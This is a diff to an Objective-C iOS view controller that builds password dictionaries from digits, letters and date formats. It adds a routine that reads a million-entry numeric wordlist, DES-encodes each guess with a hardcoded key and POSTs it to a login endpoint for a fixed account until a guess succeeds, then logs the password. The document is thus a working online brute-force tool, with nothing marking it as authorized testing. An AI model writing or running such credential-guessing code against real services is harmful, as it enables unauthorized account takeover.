@@ -7,14 +7,38 @@
 //
 
 #import "PwdDictVC.h"
+#import "JoDes.h"
 
 @interface PwdDictVC ()
 
-@property (nonatomic , strong) NSMutableArray *muarray;
+@property (nonatomic , strong) NSMutableArray *dateDatas;
 
-@property (nonatomic , strong) NSArray *datas;
+@property (nonatomic , strong) NSArray *abcDatas;
+@property (nonatomic , copy) NSArray *abcResultDatas;
 
-@property (nonatomic , copy) NSArray *resultDatas;
+
+@property (nonatomic , strong) NSArray *sendDatas;
+
+
+
+@property (nonatomic , assign) NSInteger allCount;
+@property (nonatomic , assign) NSInteger oldIndex;
+@property (nonatomic , assign) NSInteger currentIndex;
+@property (nonatomic , assign) CGFloat progress;
+@property (nonatomic , assign) CGFloat remainTime;
+@property (nonatomic , assign) CGFloat usedTime;
+
+@property (nonatomic , strong) NSDate *start;
+
+
+
+
+
+@property (nonatomic , strong) UILabel *stateLab;
+
+@property (nonatomic , strong) CADisplayLink *link;
+
+
 
 
 @end
@@ -32,62 +56,242 @@
     [btn1 addTarget:self action:@selector(clickBtn1) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:btn1];
 
-    _muarray = [NSMutableArray array];
     
-    _datas = @[@"a",@"b",@"c",@"d",@"e",@"f",@"g",@"h",@"i",@"j",@"k",@"l",@"m",@"n",@"o",@"p",@"q",@"r",@"s",@"t",@"u",@"v",@"w",@"x",@"y",@"z",@"A",@"B",@"C",@"D",@"E",@"F",@"G",@"H",@"I",@"J",@"K",@"L",@"M",@"N",@"O",@"P",@"Q",@"R",@"S",@"T",@"U",@"V",@"W",@"X",@"Y",@"Z"];
+    _stateLab = [UILabel new];
+    [self.view addSubview:_stateLab];
+    _stateLab.textColor = [UIColor greenColor];
+    _stateLab.numberOfLines = 0;
+    
+    
+    [_stateLab mas_makeConstraints:^(MASConstraintMaker *make) {
+        make.left.right.mas_equalTo(0);
+        make.centerY.mas_equalTo(0);
+    }];
+    
+    _stateLab.text = @"1111";
+    
+    
+    
+    
+    
+    _dateDatas = [NSMutableArray array];
+    
+    //_abcDatas = @[@"a",@"b",@"c",@"d",@"e",@"f",@"g",@"h",@"i",@"j",@"k",@"l",@"m",@"n",@"o",@"p",@"q",@"r",@"s",@"t",@"u",@"v",@"w",@"x",@"y",@"z",@"A",@"B",@"C",@"D",@"E",@"F",@"G",@"H",@"I",@"J",@"K",@"L",@"M",@"N",@"O",@"P",@"Q",@"R",@"S",@"T",@"U",@"V",@"W",@"X",@"Y",@"Z"];
+    
+    _abcDatas = @[@"0",@"1",@"2",@"3",@"4",@"5",@"6",@"7",@"8",@"9",];
+    
+    [self createLink];
 }
-
-- (void)createResult
-{
-    NSMutableArray * muarray = [NSMutableArray array];
-    for (int i = 0 ; i < _datas.count; i++)
-    {
-        NSString *str1 = _datas[i];
-        for (int j = 0 ;j < _resultDatas.count; j++)
-        {
-            NSString *str2 = _resultDatas[j];
-            [muarray addObject:[NSString stringWithFormat:@"%@%@",str1,str2]];
-        }
-        if (_resultDatas.count == 0) {
-            [muarray addObject:[NSString stringWithFormat:@"%@",str1]];
-        }
-    }
-    _resultDatas = [muarray copy];
-}
-
 
 - (void)clickBtn1
 {
-    NSLog(@"begin");
-    long long count = 1;
+    /////////////////////
+//    WeakObj(self);
+//    BACK(^{
+//        [selfWeak createAbcAddDate];
+//    });
+    ////////////////////
+    
+    
+    
+    
+    /////////////////////
+    NSString *dateStr = [NSString stringWithContentsOfFile:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/WordList/num/Allnum06_1000000.txt" encoding:NSUTF8StringEncoding error:nil];
+    _sendDatas = [dateStr componentsSeparatedByString:@"\n"];
 
-    while (count < 5) {
+    _start = [NSDate date];
+    _allCount = _sendDatas.count;
+
+    [self send];
+    ////////////////////
+    
+    
+    
+//    WeakObj(self);
+//
+//    BACK(^{
+//        [selfWeak createAbcFiles];
+//    });
+//
+}
+
+- (void)send
+{
+    if (_currentIndex < _sendDatas.count) {
+        @autoreleasepool{
+        NSString *tmp = _sendDatas[_currentIndex];
+        NSString *pwd = [JoDes encode:tmp key:@"22972820"];
+        [self sendPwd:pwd];
+        _currentIndex++;
+        }
+    }
+}
+
+
+
+
+
+- (void)sendPwd:(NSString *)pwd
+{
+    @autoreleasepool{
+    NSDictionary *para = @{
+                           @"UserAccount":@"DianMu",
+                           @"Password":pwd
+                           };
+    
+    NSString *url = @"http://192.168.100.201:92/UserService.svc/ILogin";
+    WeakObj(self);
+    [DMTools postWithUrl:url para:para success:^(id responseObject) {
+        if ([responseObject[@"UserAccount"] isEqualToString:@"error"] ) {
+            [selfWeak send];
+        } else {
+            NSLog(@"密码:%@",pwd);
+        }
+    } failure:^(NSError *error) {
+        NSLog(@"%@",error);
+        [selfWeak send];
+    }];
+    }
+}
+
+
+
+
+
+
+
+
+#pragma mark - link
+
+- (void)createLink
+{
+    __weak typeof(self) weakSelf = self;
+    _link = [CADisplayLink displayLinkWithTarget:weakSelf selector:@selector(linkAction:)];
+    [_link addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSRunLoopCommonModes];
+}
+
+- (void)linkAction:(CADisplayLink *)link
+{
+    if (_oldIndex != _currentIndex) {
+        double time = [_start timeIntervalSinceNow];
+        time = -time;
+        _usedTime = time;
         
-        [self createResult];
+        _progress = (CGFloat)_currentIndex/_allCount * 100;
         
-        NSLog(@"count: %ld",[_resultDatas count]);
+        _remainTime = time * 100 / _progress - time;
+        _oldIndex = _currentIndex;
+    }
+
+    _stateLab.text = [NSString stringWithFormat:@"总计:%ld \n进行到:\t%ld---\t%.2f%%  \n预计剩余时间:\t%.2fs \n已用时间:\t%.2fs",_allCount,_currentIndex,_progress,_remainTime,_usedTime];
+    
+}
+
+
+
+
+
+
+#pragma mark - abc3 + commonDate
+
+
+- (void)createAbcAddDate
+{
+    NSLog(@"begin");
+    _start = [NSDate date];
+    
+    NSString *abcStr = [NSString stringWithContentsOfFile:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/WordList/Allabc03_140608.txt" encoding:NSUTF8StringEncoding error:nil];
+    NSString *dateStr = [NSString stringWithContentsOfFile:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/WordList/CommonDate_87660.txt" encoding:NSUTF8StringEncoding error:nil];
+    
+    NSArray *abcArray = [abcStr componentsSeparatedByString:@"\n"];
+    NSArray *dateArray = [dateStr componentsSeparatedByString:@"\n"];
+    
+    NSString *path = @"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/abc2+cdate.txt";
+    
+    if (![DMTools fileExist:path]) {
+        [@"" writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    }
+    NSFileHandle *file = [NSFileHandle fileHandleForUpdatingAtPath:path];
+    
+    _allCount = abcArray.count;
+  
+    
+    NSMutableArray * muarray = [NSMutableArray array];
+    for (int i = 0 ; i < abcArray.count; i++)
+    {
+        @autoreleasepool{
+            NSString *str1 = abcArray[i];
+            for (int j = 0 ;j < dateArray.count; j++)
+            {
+                NSString *str2 = dateArray[j];
+                [muarray addObject:[NSString stringWithFormat:@"%@%@",str1,str2]];
+            }
+            NSLog(@"%d",i);
+            _currentIndex = i+1;
+            _progress = (CGFloat)(i+1)/abcArray.count * 100;
         
-        NSString *resultStr = [_resultDatas componentsJoinedByString:@"\n"];
-        NSString *path = [NSString stringWithFormat:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/Allabc%02lld.txt",count] ;
-        
-        BOOL isOK = [resultStr writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
-        
-        NSLog(@"write : %d",isOK);
-        
-        count ++;
+            NSString *result = [muarray componentsJoinedByString:@"\n"];
+            [muarray removeAllObjects];
+            [file seekToEndOfFile];
+            [file writeData: [result dataUsingEncoding:NSUTF8StringEncoding]];
+        }
     }
     
-    NSLog(@"count: %lld",count);
-    
-    NSString *resultStr = [_resultDatas componentsJoinedByString:@"\n"];
-    NSString *path = @"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/Allabc.txt";
-    
-    BOOL isOK = [resultStr writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
-    
-    NSLog(@"write : %d",isOK);
+    [file closeFile];
     
     NSLog(@"end");
 }
+
+
+
+#pragma mark - abc
+
+- (void)createAbcFiles
+{
+    NSLog(@"begin");
+    long long count = 1;
+    // 1...4
+    while (count < 9) {
+        [self createAbcResultDatas];
+        
+        NSLog(@"count: %ld",[_abcResultDatas count]);
+        NSString *resultStr = [_abcResultDatas componentsJoinedByString:@"\n"];
+        NSString *path = [NSString stringWithFormat:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/Allnum%02lld_%ld.txt",count,[_abcResultDatas count]] ;
+        BOOL isOK = [resultStr writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
+        NSLog(@"write : %d",isOK);
+        count ++;
+    }
+    
+    NSLog(@"end");
+}
+
+//前缀_上次结果   每运行一次,指数增长
+- (void)createAbcResultDatas
+{
+    NSMutableArray * muarray = [NSMutableArray array];
+    for (int i = 0 ; i < _abcDatas.count; i++)
+    {
+        NSString *str1 = _abcDatas[i];
+        for (int j = 0 ;j < _abcResultDatas.count; j++)
+        {
+            NSString *str2 = _abcResultDatas[j];
+            [muarray addObject:[NSString stringWithFormat:@"%@%@",str1,str2]];
+        }
+        if (_abcResultDatas.count == 0) {
+            [muarray addObject:[NSString stringWithFormat:@"%@",str1]];
+        }
+    }
+    _abcResultDatas = [muarray copy];
+}
+
+
+
+
+
+
+
+
+#pragma mark - Date
 
 - (void)createAllDate
 {
@@ -104,13 +308,14 @@
     while (time < maxTime) {
         NSDate *date = [NSDate dateWithTimeIntervalSince1970:time];
         
-        [_muarray addObject:[date getStringWithFormat:@"yyMd"]];
-        [_muarray addObject:[date getStringWithFormat:@"yyMMdd"]];
-        [_muarray addObject:[date getStringWithFormat:@"yyyyMMdd"]];
-        [_muarray addObject:[date getStringWithFormat:@"yyyy.MM.dd"]];
-        [_muarray addObject:[date getStringWithFormat:@"yyyy-MM-dd"]];
-        [_muarray addObject:[date getStringWithFormat:@"yyyy/MM/dd"]];
-        [_muarray addObject:[date getStringWithFormat:@"yyyy_MM_dd"]];
+        [_dateDatas addObject:[date getStringWithFormat:@"yyMd"]];
+        [_dateDatas addObject:[date getStringWithFormat:@"yyMMdd"]];
+        [_dateDatas addObject:[date getStringWithFormat:@"yyyyMMdd"]];
+        [_dateDatas addObject:[date getStringWithFormat:@"yyyyMd"]];
+        [_dateDatas addObject:[date getStringWithFormat:@"yyyy.MM.dd"]];
+        [_dateDatas addObject:[date getStringWithFormat:@"yyyy-MM-dd"]];
+        [_dateDatas addObject:[date getStringWithFormat:@"yyyy/MM/dd"]];
+        [_dateDatas addObject:[date getStringWithFormat:@"yyyy_MM_dd"]];
         
         time += oneDay;
         count ++;
@@ -118,8 +323,8 @@
     
     NSLog(@"count: %lld",count);
     
-    NSString *resultStr = [_muarray componentsJoinedByString:@"\n"];
-    NSString *path = @"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/AllDate.txt";
+    NSString *resultStr = [_dateDatas componentsJoinedByString:@"\n"];
+    NSString *path = [NSString stringWithFormat:@"/Users/xianwangdoudianzixinxiyouxiangongsi/Desktop/AllDate_%lld.txt",count * 8];
     
     BOOL isOK = [resultStr writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
     
@@ -129,14 +334,15 @@
 }
 
 
-
-
-
 - (void)didReceiveMemoryWarning {
     [super didReceiveMemoryWarning];
     NSLog(@"收到内存警告");
 }
 
-
+-(void)dealloc{
+    MyLog(@" Game Over ... ");
+    
+    [_link invalidate];
+}
 
 @end
